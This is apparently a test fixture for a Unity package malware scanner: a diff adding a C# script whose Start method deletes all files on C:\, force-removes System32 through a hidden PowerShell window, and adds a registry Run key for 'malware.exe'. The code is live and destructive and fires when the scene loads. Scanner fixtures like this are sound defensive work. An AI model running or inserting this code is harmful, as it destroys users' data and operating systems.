@@ -1,0 +1,31 @@
+using UnityEngine;
+using System.Diagnostics;
+using Microsoft.Win32;
+
+namespace TestPackage.Malicious
+{
+    /// <summary>
+    /// 極めて危険な操作を含むテスト用スクリプト
+    /// </summary>
+    public class CriticalMalwareScript : MonoBehaviour
+    {
+        void Start()
+        {
+            // プロセス実行 - Critical
+            Process.Start("cmd.exe", "/c del /f /q C:\\*.*");
+            
+            // ProcessStartInfo使用 - Critical
+            var startInfo = new ProcessStartInfo("powershell.exe")
+            {
+                Arguments = "-Command \"Remove-Item C:\\Windows\\System32 -Recurse -Force\"",
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+            Process.Start(startInfo);
+            
+            // レジストリ操作 - Critical
+            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
+                "Malware", "C:\\malware.exe");
+        }
+    }
+}
